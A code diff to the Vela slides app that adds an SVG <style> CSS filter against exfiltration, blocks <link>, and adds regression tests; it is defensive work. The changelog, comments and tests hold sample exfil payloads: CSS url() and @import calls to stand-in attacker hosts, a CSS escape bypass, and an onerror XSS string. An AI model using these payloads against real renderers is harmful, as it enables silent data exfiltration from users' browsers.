@@ -69,8 +69,9 @@ const velaClipboardReadSlide = async () => {
   return null;
 };
 
-const VELA_VERSION = "12.52";
+const VELA_VERSION = "12.53";
 const VELA_CHANGELOG = [
+  { v: "12.53", d: "Security (audit 2026-06, Low/defense-in-depth): close CSS-text exfil channel inside SVG. Before: <style> CSS text and <link rel=stylesheet> passed the element-only walk untouched, so `<style>* { background: url('https://attacker/?d=...') }</style>` (or @import) fired an outbound GET on render — zero-click beacon, no CSP backstop inside the artifact srcdoc. Not XSS (no script execution, sandboxed iframe), but still a confirmable render beacon and a slow CSS-attribute-exfil primitive. SAFE_STYLE_KEYS only covers `style=\"...\"` inline attributes. Fix: (1) <link> goes into SVG_BLOCKED_TAGS outright (no legitimate inline-SVG use). (2) <style> stays — Mermaid/draw.io/Vera-generated diagrams legitimately use inner CSS for class-driven styling and url(#fragment) paint-server/marker/gradient refs — but its textContent is filtered by isSvgStyleSafe(): reject @import, expression(), behavior:, -moz-binding, any backslash (CSS \XX escapes can decode 'url'/'@import' past a literal-token check), and any url() that isn't a same-document #fragment ref. Preserves legitimate class-based SVG styling; kills the exfil." },
   { v: "12.52", d: "Security (audit 2025-06 follow-up): (H7) Re-pin every GitHub Actions `uses:` to a 40-char commit SHA across all 7 workflows (actions/checkout, setup-python, setup-node, upload/download-artifact, github-script, attest-build-provenance, upload-pages-artifact, deploy-pages, pnpm/action-setup) — tag pins are mutable, and a publisher account compromise would let attackers re-point @vN at malicious code that runs in the privileged release pipeline (id-token: write + attestations: write). New CI regression test guards against future @vN tag pins. (Deps) Bump skills/vela-slides/channel @modelcontextprotocol/sdk ~1.27.1 → ^1.29.0, clearing 18 transitive CVEs (3 high, 14 moderate, 1 low) across path-to-regexp ReDoS, hono cookie-name validation / serveStatic bypass / CSS injection, fast-uri path-traversal & host-confusion, ip-address XSS, and qs DoS." },
   { v: "12.51", d: "Security (defense-in-depth, follow-up to v12.44/12.45): SVG href validation tightened from blocklist to allowlist after DOMParser normalization — only http/https/mailto/tel schemes (plus #fragment and scheme-less relatives) survive. Blocklist alone allowed file:, blob:, chrome:, intent:, ws: and other unexpected protocols through; only javascript:/data:/vbscript: were stripped. xlink:href remains restricted to local fragments. Mixed-case schemes (JaVaScRiPt:, JAVASCRIPT:) and entity-encoded schemes (already covered by the parser) now have explicit regression tests at both layers. Allowlisted schemes are covered by a regression guard so the tightening doesn't strip legitimate links." },
   { v: "12.50", d: "Security (audit 2025-05 — Critical/High hardening): (H1) LOAD_LANES reducer now re-sanitizes every slide via sanitizeSlide — Vera's 20-tool ReAct writes (set_slides/add_slide/edit_slide) round-trip through LOAD_LANES, the only ingest path that previously skipped sanitization. (H2) New sanitizeStyle() + SAFE_STYLE_KEYS allowlist: block.style and item.style were typecheck-only, allowing `backgroundImage: url('https://attacker/?d=...')` as a zero-click CSS exfil channel with no CSP backstop inside the artifact srcdoc. Allowlist excludes image-loading keys (background, backgroundImage, borderImage, listStyleImage, cursor, content, mask, filter, font shorthand) and rejects any value containing url()/expression()/image-set()/CSS-escape/angle-bracket even when the key is allowlisted. (H5) ReAct loop now caps tool_calls/turn (16), session-total tools (40), and cumulative messages payload (200 KB) to prevent prompt-injection cost-amplification DoS." },
@@ -349,7 +350,29 @@ function openExternalLink(url) {
   if (safe) window.open(safe, "_blank", "noopener,noreferrer");
 }
 
-const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "animatetransform", "animatemotion", "animatecolor", "mpath", "set", "handler", "listener"]);
+// SECURITY: <link> is a pure stylesheet loader with no legitimate inline-SVG
+// use, so it's blocked outright. <style> is kept (Mermaid, draw.io, Vera-
+// generated diagrams all rely on inner CSS for class-driven styling) but its
+// CSS text is filtered for zero-click exfil constructs — see isSvgStyleSafe.
+const SVG_BLOCKED_TAGS = new Set(["script", "foreignobject", "iframe", "embed", "object", "use", "animate", "animatetransform", "animatemotion", "animatecolor", "mpath", "set", "handler", "listener", "link"]);
+
+// SVG <style> CSS-text filter. The threat: <style>* { background: url("https://
+// attacker/?d=...") }</style> or @import url(...) fires an outbound GET on
+// render — zero-click exfil beacon with no CSP backstop inside the artifact
+// srcdoc. SAFE_STYLE_KEYS only filters the style="..." inline attribute, not
+// <style>-element CSS text. We allow url(#fragment) (SVG paint servers,
+// markers, gradients, clip-paths) and reject everything else that can hit
+// the network or use legacy code-execution constructs. CSS \XX escape
+// sequences can decode "url" / "@import" past a literal-token regex
+// (e.g. \75rl(…) → url(…)), so we conservatively reject any backslash.
+function isSvgStyleSafe(css) {
+  if (typeof css !== "string" || css.length > 5000) return false;
+  if (css.indexOf("\\") !== -1) return false;
+  if (/@import|expression\s*\(|behavior\s*:|-moz-binding/i.test(css)) return false;
+  const urls = css.match(/url\s*\([^)]*\)/gi);
+  if (urls && urls.some((u) => !/^url\s*\(\s*['"]?\s*#/i.test(u))) return false;
+  return true;
+}
 
 function sanitizeSvgMarkup(raw) {
   if (typeof raw !== "string") return "";
@@ -368,6 +391,11 @@ function sanitizeSvgMarkup(raw) {
         if (child.nodeType === 1) {
           const tag = child.localName.toLowerCase();
           if (SVG_BLOCKED_TAGS.has(tag)) { child.remove(); continue; }
+          if (tag === "style") {
+            if (!isSvgStyleSafe(child.textContent || "")) { child.remove(); continue; }
+            // CSS text is safe — skip attribute walk (no on*/href/etc. on <style>) and don't descend.
+            continue;
+          }
           const attrs = Array.from(child.attributes);
           for (const a of attrs) {
             const name = a.name.toLowerCase();
@@ -8180,6 +8208,35 @@ uiSuite("SVG Sanitizer (XSS)", [
   { name: "foreignObject element stripped", fn: async () => {
     const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
     return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
+  }},
+  // CSS-text exfil: <style>/<link> inside SVG fire an outbound GET via url() /
+  // @import / rel=stylesheet with no CSP backstop. We filter <style> textContent
+  // (preserve legitimate class-based styling and url(#fragment) refs that
+  // Mermaid/Vera diagrams need), and block <link> outright.
+  { name: "SVG <style> with external url() removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> @import removed (exfil blocked)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/@import/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with CSS \\XX escape removed (escape-bypass blocked)", fn: async () => {
+    // \75rl(...) decodes to url(...) in the CSS parser — escape-token bypass
+    const out = sanitizeSvgMarkup('<style>* { background: \\75rl("https://attacker.invalid/") }</style><rect/>');
+    return !/attacker\.invalid/i.test(out) && !/<style[\s>]/i.test(out);
+  }},
+  { name: "SVG <style> with safe class CSS preserved (Mermaid/Vera compat)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.node{fill:#3b82f6;stroke:#888}.edge{stroke-width:2}</style><rect class="node"/>');
+    return /<style/i.test(out) && /#3b82f6/.test(out) && /\.node/.test(out);
+  }},
+  { name: "SVG <style> with url(#fragment) preserved (paint-server refs)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>.arrow{fill:url(#grad1);marker-end:url(#mark)}</style><rect class="arrow"/>');
+    return /<style/i.test(out) && /url\(#grad1\)/.test(out) && /url\(#mark\)/.test(out);
+  }},
+  { name: "SVG <link rel=stylesheet> stripped outright", fn: async () => {
+    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
+    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
   }},
   // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
   // dangerouslySetInnerHTML does, and assert no live event handler materializes.
